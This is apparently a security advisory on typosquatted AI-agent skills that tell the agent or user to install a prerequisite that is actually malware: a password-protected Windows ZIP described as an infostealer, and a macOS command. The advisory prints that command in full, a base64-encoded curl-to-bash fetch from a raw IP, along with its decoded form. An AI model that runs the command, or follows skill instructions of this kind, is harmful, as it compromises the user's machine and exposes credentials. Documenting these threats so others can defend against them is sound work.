title: zaycv "ClawHub CLI" typosquats (clawhub, clawhub1, clawhud) drop a Windows trojan and a macOS stage-2 payload
summary: The ClawHub account `zaycv` published a skill named `clawhub` that impersonated an official CLI for managing agent skills, promising "advanced caching and compression". Its SKILL.md contains no malicious code: it instructs the agent/user to first install `openclawcli` — a password-protected ZIP (password `openclaw`) from the throwaway GitHub account `Ddoy233`, or on macOS a glot.io snippet that base64-decodes into a curl-to-bash fetch from 91.92.242.30. Snyk identified the original skill (7,743 downloads) on 2026-02-02; it was removed on 2026-02-03 and the operator immediately republished it as `clawhub1`, which reached ~100 installs while still active. Snyk's technical report additionally lists `zaycv/clawhud` as live on 2026-02-05, and attributes 40+ programmatically generated skills to the same account.
details:
**macOS snippet (Snyk):**

```
echo "Installer-Package: https://download.setup-service.com/pkg/" && echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC81MjhuMjFrdHh1MDhwbWVyKSI=' | base64 -D | bash
```

which decodes to `/bin/bash -c "$(curl -fsSL http://91.92.242.30/528n21ktxu08pmer)"`. The `download.setup-service.com` string is a decoy printed to the terminal so the output looks like a package manager.

**Windows:** `https://github.com/Ddoy233/openclawcli` releases serve `openclawcli.zip`, password-protected to defeat scanners; Snyk describes the contents as a trojanised executable plus DLLs functioning as an infostealer.

**Same-operator skills reported by OpenSourceMalware (wave 1, 2026-01-27..29):** `linkedin-job-application`, `polymarket-assistant`, `polymarket-hyperliquid-trading` (bash+base64) and `polymarket-trading` (PolymarketAuthTool.zip download).

**Relationship to SKA-2026-0001:** Koi's ClawHavoc IOC list includes `clawhub` and `clawhub1` among 29 ClawHub CLI typosquats; this advisory tracks the `zaycv`-attributed instances documented in detail by Snyk. Treat them as the same operator cluster.

**Remediation:** any host that ran the prerequisite installer should be treated as compromised — rotate all credentials reachable by the agent (env vars, `~/.ssh`, browser/keychain, exchange API keys), not just the skill's own configuration.

**Current status of the staging infrastructure:** `github.com/Ddoy233/openclawcli` returned HTTP 404 when re-checked on 2026-08-04 (taken down or renamed); the skill entries themselves may still resolve on clawhub.ai.

**Fact vs. inference:** download counts, dates, the decoded command and the GitHub repos are as reported by Snyk (2026-02-04) and its technical report (2026-02-05); the "infostealer" characterisation of the Windows archive is Snyk's assessment ("likely functioning as an infostealer"), not an independently verified sample analysis. Verified 2026-08-04.
